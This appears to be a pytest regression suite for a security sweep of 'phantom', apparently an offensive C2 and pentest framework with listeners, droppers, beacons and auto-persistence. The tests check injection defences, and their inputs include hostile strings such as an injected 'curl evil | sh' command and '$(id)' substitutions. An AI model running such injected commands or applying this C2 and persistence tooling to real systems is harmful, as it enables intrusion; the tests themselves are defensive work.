"""Regression tests for the round-2 security sweep.

Covers the fixes for:

  * A-1 argv-only execution on the operator API path (shell never sees the
    operator/renderer string);
  * A-2 learned capabilities loaded from an out-of-process descriptor —
    the module body never executes in the main process;
  * A-3 CORS restricted to the local renderer origins;
  * A-6 bounded tracker store;
  * A-7 sandbox sample execution without a shell;
  * Review-3 remote sessions get their own expiring, revocable token;
  * Review-4 auto-persist is an engagement grant.
"""
import json
import os
import textwrap
import time
from pathlib import Path

import pytest


# ── A-1: argv-only execution ────────────────────────────────────────────────

def test_safe_exec_parses_pipes_and_redirs():
    from phantom.core.safe_exec import parse
    p = parse("find / -type f 2>/dev/null | head -5")
    assert p.segments == [["find", "/", "-type", "f"], ["head", "-5"]]
    assert p.separators == ["|"]
    assert p.stderr_devnull == [True, False]


def test_safe_exec_refuses_substitution():
    from phantom.core.safe_exec import UnsafeCommand, parse
    for bad in ("nmap $(id)", "nmap `id`", "nmap ${HOME}"):
        with pytest.raises(UnsafeCommand):
            parse(bad)


def test_safe_exec_quoted_separator_is_an_argument():
    from phantom.core.safe_exec import parse
    p = parse('msfconsole -q -x "use a; run; exit"')
    assert len(p.segments) == 1
    assert p.segments[0][-1] == "use a; run; exit"


def test_run_local_executes_without_a_shell():
    from phantom.core.safe_exec import parse, run_local
    # `;` really is two commands, and no shell expanded anything
    r = run_local(parse("echo one; echo two"), timeout=10)
    assert r.returncode == 0 and r.stdout.strip() == "two"
    r = run_local(parse("false && echo never"), timeout=10)
    assert r.returncode != 0 and "never" not in r.stdout


def test_run_local_pipe_wires_stdout_to_stdin():
    from phantom.core.safe_exec import parse, run_local
    # `seq` (not `printf`) produces the multi-line stream: Git-Bash's
    # printf.exe mangles embedded newlines when invoked without a shell.
    r = run_local(parse("seq 1 3 | grep -c ."), timeout=10)
    assert r.stdout.strip() == "3"
    assert run_local(parse("seq 1 5 | wc -l"), timeout=10).stdout.strip() == "5"


def test_backend_run_pipeline_refuses_substitution():
    from phantom.api.backend import backend_dispatcher
    r = backend_dispatcher.run_pipeline("echo $(whoami)", "", timeout=5)
    assert r.returncode == -1 and "refused" in (r.error or "")


def test_backend_run_pipeline_executes_argv():
    from phantom.api.backend import backend_dispatcher
    r = backend_dispatcher.run_pipeline("echo hello-argv", "", timeout=10)
    assert r.returncode == 0 and r.stdout.strip() == "hello-argv"


def test_module_spawns_avoid_the_shell():
    """Background listeners / deauth spawns take operator- or device-derived
    values (payload names, interface names): they must be argv, not strings."""
    import inspect
    from phantom.modules import handler as H
    from phantom.modules import wifi as W
    for fn in (H.HandlerModule.start_listener, H.HandlerModule.do_nc,
               H.HandlerModule.do_ncat):
        src = inspect.getsource(fn)
        assert "shell=True" not in src, fn
        assert "shell=False" in src
    assert "shell=True" not in inspect.getsource(W.WifiModule.do_handshake)


def test_listener_rejects_hostile_payload_and_port():
    from phantom.modules.handler import HandlerModule
    m = HandlerModule()
    hostile = 'x"; curl evil | sh; #'
    assert m.start_listener("4444", hostile, background=True) is None
    assert m._listeners == {}
    assert m.start_listener("not-a-port", "linux/x64/shell_reverse_tcp") is None
    assert m._listeners == {}


def test_no_operator_string_reaches_a_shell():
    """Source-level guarantee: the API path never hands a string to a shell."""
    import inspect
    from phantom.api import backend as B
    src = inspect.getsource(B.BackendDispatcher.run_pipeline)
    assert "run_local" in src and "to_shell_string" in src
    # the legacy shell path still exists but is not what run_pipeline calls
    assert "shell=True" not in src


# ── A-2: learned capabilities never import in-process ───────────────────────

LEARNED_MODULE = '''
import os
# hostile top-level side effect: records the pid of whatever imports me
open(r"{sentinel}", "w").write(str(os.getpid()))
from phantom.automation.guidance.kit import _mk, _mk_slot


def _adapter(slots):
    return "OUTPUT web_header:server"


def _interp(output, wm, slots):
    from phantom.automation.belief import Finding
    return [Finding(kind="web_app", key="learned_probe",
                    value={{"ok": True}}, target=wm.target,
                    evidence=output[:60])]


CAPABILITY = _mk("learned.pid_probe", "web", "pid probe",
                 [_mk_slot("base_url", "url", False, "base")],
                 ["web_app"], _adapter, _interp,
                 requires=["web_header"])
'''


@pytest.fixture
def learned_module(tmp_path):
    sentinel = tmp_path / "pid.txt"
    mod = tmp_path / "learned_probe.py"
    mod.write_text(LEARNED_MODULE.format(sentinel=sentinel), encoding="utf-8")
    return mod, sentinel


def test_descriptor_read_out_of_process(learned_module):
    from phantom.automation.guidance.learned.descriptor import describe
    mod, sentinel = learned_module
    data = describe(str(mod))
    assert data and data["id"] == "learned.pid_probe"
    assert data["requires"] == ["web_header"]
    assert data["has_interpreter"] is True
    # the module body ran in ANOTHER process
    assert int(sentinel.read_text()) != os.getpid()


def test_reconstructed_capability_carries_no_callables(learned_module):
    from phantom.automation.guidance.learned import _capability_from_descriptor
    from phantom.automation.guidance.learned.descriptor import describe
    mod, _ = learned_module
    cap = _capability_from_descriptor(describe(str(mod)), str(mod))
    assert cap.adapter is None and cap.interpreter is None
    assert cap.source_module == str(mod)
    assert cap.requires == ["web_header"]


def test_declarative_requires_gate_the_planner(learned_module):
    from phantom.automation.guidance.learned import _requires_predicate

    class WM:
        def __init__(self, hits):
            self._hits = hits

        def has_any(self, kind):
            return kind in self._hits

        def get(self, kind, key):
            return object() if (kind, key) in self._hits else None

        def find(self, kind, **attrs):
            return [object()] if kind in self._hits else []

    assert _requires_predicate("web_header")(WM({"web_header"})) is True
    assert _requires_predicate("web_header")(WM(set())) is False
    assert _requires_predicate("service:tcp/445")(WM({("service", "tcp/445")})) is True
    assert _requires_predicate("service:port=445")(WM({"service"})) is True


def test_worker_returns_findings_as_data(learned_module):
    from phantom.automation.guidance.learned.worker import run_learned_task
    mod, _ = learned_module
    res = run_learned_task(str(mod), {"base_url": "http://x"},
                           {"target": "10.0.0.9", "findings": []})
    assert res["ok"] and res["output"].startswith("OUTPUT")
    assert res["findings"][0]["key"] == "learned_probe"
    assert isinstance(res["findings"], list)      # data, not objects


def test_worker_strips_phantom_env(tmp_path):
    """The worker must not inherit PHANTOM_* secrets."""
    import inspect
    from phantom.automation.guidance.learned import worker
    src = inspect.getsource(worker._worker_env)
    assert "PHANTOM_" in src and "pop" in src


# ── A-3: CORS ───────────────────────────────────────────────────────────────

def test_cors_is_not_a_wildcard():
    import inspect
    from phantom.api import server as S
    src = inspect.getsource(S.cors_middleware)
    assert 'Allow-Origin"] = "*"' not in src
    assert "_LOCAL_ORIGINS" in src
    assert "http://localhost:5173" in S._LOCAL_ORIGINS


# ── A-6: bounded tracker store ──────────────────────────────────────────────

def test_hit_store_is_bounded():
    from phantom.automation.social.tracker import HitStore
    store = HitStore()
    for i in range(HitStore.MAX_EVENTS_PER_CODE + 50):
        store.record_open("CODE", f"10.0.0.{i % 255}", "ua")
    assert len(store.opens("CODE")) == HitStore.MAX_EVENTS_PER_CODE


def test_hit_store_bounds_distinct_codes():
    from phantom.automation.social.tracker import HitStore
    store = HitStore()
    original = HitStore.MAX_CODES
    try:
        HitStore.MAX_CODES = 10
        for i in range(40):
            store.record_open(f"C{i}", "10.0.0.1", "ua")
        assert len(store._opens) <= 10
    finally:
        HitStore.MAX_CODES = original


# ── A-7: sandbox sample run without a shell ─────────────────────────────────

def test_sandbox_run_sample_has_no_shell():
    import inspect
    from phantom.automation.sandbox.sandbox import VmBackend
    src = inspect.getsource(VmBackend.run_sample)
    assert "shell=True" not in src
    assert "shlex.split" in src


# ── Review-3: remote session grants ─────────────────────────────────────────

def test_remote_session_lifecycle():
    from phantom.core.c2_server import C2State
    st = C2State()
    rec = st.issue_remote_session(beacon_id="B1", ttl_seconds=600)
    ok, sid = st.check_remote_session(rec["token"])
    assert ok and sid == rec["session_id"]
    assert st.check_remote_session("bogus")[0] is False
    assert st.revoke_remote_session(token=rec["token"]) == 1
    ok_after, why = st.check_remote_session(rec["token"])
    assert not ok_after and "revoked" in why


def test_remote_session_expiry_is_enforced():
    from phantom.core.c2_server import C2State
    st = C2State()
    rec = st.issue_remote_session(ttl_seconds=600)
    # force the deadline into the past
    st.remote_sessions[rec["token"]]["expires_at"] = "2001-01-01T00:00:00"
    ok, why = st.check_remote_session(rec["token"])
    assert not ok and "expired" in why


def test_remote_dropper_prefers_session_token():
    from phantom.utils.builder import generate_remote_dropper
    with_session = generate_remote_dropper("linux", "10.0.0.1", 8080,
                                           use_ssl=False, session_token="TOK")
    assert "rs=TOK" in with_session and "auth=" not in with_session


# ── Review-4: auto-persist grant ────────────────────────────────────────────

def test_auto_persist_is_a_grant(monkeypatch):
    from phantom.core import c2_server as S
    monkeypatch.setenv("PHANTOM_AUTO_PERSIST", "0")
    assert S._auto_persist_allowed() is False
    st = S.C2State()
    st.update_beacon("B-NOPERSIST", {"ip": "10.0.0.1", "os": "linux"})
    assert st.tasks.get("B-NOPERSIST") == []
    monkeypatch.setenv("PHANTOM_AUTO_PERSIST", "1")
    assert S._auto_persist_allowed() is True
    st2 = S.C2State()
    st2.update_beacon("B-PERSIST", {"ip": "10.0.0.2", "os": "windows"})
    assert [t["command"] for t in st2.tasks["B-PERSIST"]] == ["persist"]


def test_auto_persist_decision_is_audited(monkeypatch):
    from phantom.core import c2_server as S
    from phantom.utils.audit_log import audit_log
    monkeypatch.setenv("PHANTOM_AUTO_PERSIST", "0")
    st = S.C2State()
    st.update_beacon("B-AUDIT", {"ip": "10.0.0.3", "os": "linux"})
    events = [e.get("event") for e in audit_log.tail(50)]
    assert "auto_persist_skipped" in events or "audit" in " ".join(events)
